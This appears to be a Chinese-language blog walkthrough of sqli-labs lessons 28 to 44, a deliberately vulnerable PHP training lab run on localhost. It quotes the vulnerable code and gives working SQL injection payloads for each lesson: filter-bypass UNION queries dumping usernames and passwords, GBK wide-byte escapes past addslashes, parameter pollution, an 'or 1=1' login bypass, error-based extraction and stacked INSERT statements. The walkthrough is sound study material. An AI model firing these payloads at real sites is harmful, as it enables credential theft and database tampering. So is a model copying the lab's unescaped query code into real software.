<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);					<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里及使用了正则<code>/union\s+select/i</code>，<code>/i</code>是不区分大小写，我们可以使用<code>unionunion selectselect</code>去绕过</p>
<p>sql语句也发生了小的改变，我们可以左右闭合</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>根据黑名单构造payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-28/?id=999&apos;)%0aunion%0aunion%0aselectselect%0a1,(select%0agroup_concat(id,username,password)%0afrom%0ausers),3%0a or (&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569762392006.png" alt="1569762392006"></p>
<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p><strong>index.php</strong></p>
<p>???没有任何过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-29/?id=1&apos; and 1=2 union select 1,(select group_concat(id,username,password)from users),3%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569762538849.png" alt="1569762538849"></p>
<p>重点在<code>login.php</code></p>
<p>看一下主要逻辑</p>
<p><strong>login.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">	$hint=$qs;</span><br><span class="line">	$id1=java_implimentation($qs);</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="comment">//echo $id1;</span></span><br><span class="line">	whitelist($id1);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;	</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里对url注入的参数进行了<code>java_implimentation</code>函数的解析，然后使用<code>whitelist</code>对其进行判断，而对于真正带入sql语句查询的<code>$id</code>则是没有进行任何过滤。</p>
<p><strong>login.php java_implimentation</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span>//这个只截<span class="title">id</span>参数的<span class="title">value</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);<span class="comment">//获得参数数据</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);<span class="comment">//截取value前两个字符，如果等于id</span></span><br><span class="line">		<span class="keyword">if</span>($val==<span class="string">"id"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); <span class="comment">//就截取3~30位，27个字符</span></span><br><span class="line">			<span class="keyword">return</span> $id_value;<span class="comment">//返回数值</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里利用点在于，<code>$qs_array= explode(&quot;&amp;&quot;,$q_s);</code>根据字符<code>&amp;</code>进行分组，然后后续<code>foreach</code>循环中，获取到第一个开头为<code>id</code>的数组时返回数据。</p>
<p>继续向下看<strong>login.php whitelist</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span>//</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">	<span class="keyword">if</span>($match)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo "you are good";</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">		<span class="comment">//echo "you are bad";</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要是看它的正则<code>/^\d+$/</code></p>
<p><code>/^</code>，匹配 ^ 字符本身。</p>
<p><code>\d+</code>， 匹配一个或多个数字字符</p>
<p><code>$/</code>，匹配输入字符串的结尾位置</p>
<p>整体的意思为，匹配 以数字开头的一个或多个数字且以数字结尾的字符串。</p>
<p>也就是我们要通过它的规则才能够正常进行注入，否则的话，会打开<code>hackd.php</code>页面</p>
<p>根据<code>java_implimentation</code>函数的特性我们构造如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-29/login.php?id=1&amp;id=2&apos; and 1=2 union select 1,(select group_concat(id,username,password)from(users)),3%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569832174245.png" alt="1569832174245"></p>
<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; .$id. &apos;&quot;&apos;;</span><br></pre></td></tr></table></figure>
<p>这里只是将sql语句的单引号变成了双引号，其他的和less-29没有区别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-30/login.php?id=1&amp;id=1&quot; and 1=2 union select 1,(select group_concat(id,username,password)from(users)),3 %23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569832463246.png" alt="1569832463246"></p>
<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> .$id. <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-31这里也只是sql语句发生了变动</p>
<p>同样稍微修改payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-31/login.php?id=1&amp;id=1&quot;) and 1=2 union select 1,(select group_concat(id,username,password)from(users)),3 %23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569833017930.png" alt="1569833017930"></p>
<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>测试输入<code>id = 1&#39;</code>发现在下面自动加上了反斜杠</p>
<p><img src="\img\images\sqli-lib\1569833128483.png" alt="1569833128483"></p>
<p>web页面并没有报错，猜测可能是宽字节注入</p>
<p>输入<code>?id=1%df&#39;</code>时成功报错，判断为宽字节注入</p>
<p><img src="\img\images\sqli-lib\1569833215648.png" alt="1569833215648"></p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-32/?id=1%df&apos; and 1=2 union select 1,(select group_concat(id,username,password)from(users)),3%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569833303284.png" alt="1569833303284"></p>
<p>查看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>果然宽字节注入</p>
<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>这里将原来自写的<code>check_addslashes</code>改成了<code>addslashes</code>，其他的没有改变，所以用原payload一样可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>POST版本的宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&apos;or updatexml(1,concat(0x7e,(select group_concat(0x7e,id,username,password)from(users))),0)%23&amp;passwd=bbb</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569835123748.png" alt="1569835123748"></p>
<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>没有引号包裹的数字型注入，但是如果用不到引号之后这里的<code>addslashes</code>就形同虚设了。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-35/?id=1 and 1=2 union select 1,group_concat(id,username,password),3 from(users) %23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569835896664.png" alt="1569835896664"></p>
<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line">$id=check_quotes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这里使用了<code>mysql_real_escape_string</code>函数</p>
<p><code>https://www.php.net/manual/zh/function.mysql-real-escape-string.php</code></p>
<p>查询php手册可以知道</p>
<p><code>mysql_real_escape_string</code> — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集</p>
<p><code>mysql_real_escape_string()</code> 调用mysql库的函数<code>mysql_real_escape_string</code> 在以下字符前添加反斜杠:</p>
<ul>
<li><code>\x00</code></li>
<li><code>\n</code></li>
<li><code>\r</code>,</li>
<li><code>\</code></li>
<li><code>&#39;</code></li>
<li><code>&quot;</code> </li>
<li><code>\x1a</code></li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>仍然可以用宽字节注入，来进行正常注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-36/?id=1%df&apos; and 1=2 union select 1,(select(group_concat(id,username,password))from(users)),3%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569836717631.png" alt="1569836717631"></p>
<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>查看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uname1=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd1=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>是一个宽字节的POST注入，可以使用万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; or 1=1%23&amp;passwd=</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569887583719.png" alt="1569887583719"></p>
<p>也使用报错注入读出来数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; or updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(users))),0)%23&amp;passwd=</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569887811502.png" alt="1569887811502"></p>
<h2 id="Less-38-Stacked-injection"><a href="#Less-38-Stacked-injection" class="headerlink" title="Less-38 Stacked injection"></a>Less-38 Stacked injection</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-38/?id=1&apos; and 1=2 union select 1,(select(group_concat(id,username,password))from(users)),3%23</span><br></pre></td></tr></table></figure>
<p>直接注入？？？</p>
<p><img src="\img\images\sqli-lib\1569888112247.png" alt="1569888112247"></p>
<p>看了下sql注入天书原来考察点是堆叠查询</p>
<blockquote>
<p>在 SQL 中，分号<code>;</code>用来表示一条 SQL 语句的结束。试想我们在<code>;</code>结束一个 SQL 语句后继续构造下一条语句，两条语句会不会一起执行？这个想法也就造就了堆叠注入。</p>
<p>而 <strong>Union Injection（联合注入）</strong>也是将两条语句合并在一起，两者之间有什么区别？<br> 区别就在于<code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句</p>
</blockquote>
<p>因为执行sql语句时使用了<code>mysqli_multi_query()</code>函数，才使我们能够使用堆叠查询。</p>
<p><code>mysqli_multi_query()</code>作用：函数执行一个或多个针对数据库的查询，多个查询用分号进行分隔</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-38/?id=1&apos;;insert into users values(20,&apos;Stacked&apos;,&apos;Stacked&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查询数据库</p>
<p><img src="\img\images\sqli-lib\1569891463061.png" alt="1569891463061"></p>
<p>可以看到后面的插入语句执行成功</p>
<p>当我们切换到Less-1，执行同样的语句</p>
<p><img src="\img\images\sqli-lib\1569891540073.png" alt="1569891540073"></p>
<p>并不能成功执行，也就是说，只有当使用支持多条语句的sql语句执行函数(例如<code>mysqli_multi_query()</code>)与数据库交互式，我们才可以使用堆叠注入。</p>
<h2 id="Less-39-Stacked-injection"><a href="#Less-39-Stacked-injection" class="headerlink" title="Less-39 Stacked injection"></a>Less-39 Stacked injection</h2><p>这里同样使用了支持多条语句查询的函数，只是sql语句的拼接与之前略有不同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p>稍微修改payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-39/?id=1;insert into users values(100,&apos;less39&apos;,&apos;less39&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569891861510.png" alt="1569891861510"></p>
<h2 id="Less-40-Stacked-injection"><a href="#Less-40-Stacked-injection" class="headerlink" title="Less-40 Stacked injection"></a>Less-40 Stacked injection</h2><p>这个文件不少，像是仿制了一个用户注册登陆修改密码的流程</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p>这个与之前只是sql语句拼接稍做了修改，同样可以堆叠注入</p>
<p>其他的文件和Less-24的一样，有二次注入的利用点</p>
<p>直接根据sql语句堆叠注入插入即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-40/?id=1&apos;);insert into users values(101,&apos;less40&apos;,&apos;less40&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569892563886.png" alt="1569892563886"></p>
<p>成功插入数据</p>
<h2 id="Less-41-Stacked-injection"><a href="#Less-41-Stacked-injection" class="headerlink" title="Less-41 Stacked injection"></a>Less-41 Stacked injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p>同样的sql语句做了更改，支持堆叠查询</p>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569892746816.png" alt="1569892746816"></p>
<p>成功插入</p>
<h2 id="Less-42-Stacked-injection"><a href="#Less-42-Stacked-injection" class="headerlink" title="Less-42 Stacked injection"></a>Less-42 Stacked injection</h2><p><strong>login.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p>在login.php页面中未对<code>login_password</code>进行转义，导致了漏洞的产生，因为<code>mysqli_multi_query</code>这里同样可以使用堆叠注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=test&amp;login_password=1&apos;;insert into users values(110,&apos;less42&apos;,&apos;less42&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569893436277.png" alt="1569893436277"></p>
<p>成功添加数据</p>
<h2 id="Less-43-Stacked-injection"><a href="#Less-43-Stacked-injection" class="headerlink" title="Less-43 Stacked injection"></a>Less-43 Stacked injection</h2><p>Less-43与Less-42基本一致，只有sql语句拼接这里发生了一些小的变化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username=('$username') and password=('$password')"</span>;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=test&amp;login_password=1&apos;);insert into users values(111,&apos;less43&apos;,&apos;less43&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据表</p>
<p><img src="\img\images\sqli-lib\1569893766926.png" alt="1569893766926"></p>
<p>成功插入数据</p>
<h2 id="Less-44-Stacked-injection"><a href="#Less-44-Stacked-injection" class="headerlink" title="Less-44 Stacked injection"></a>Less-44 Stacked injection</h2><p>这里的sql语句和less42完全一样，区别在于没有报错语句</p>
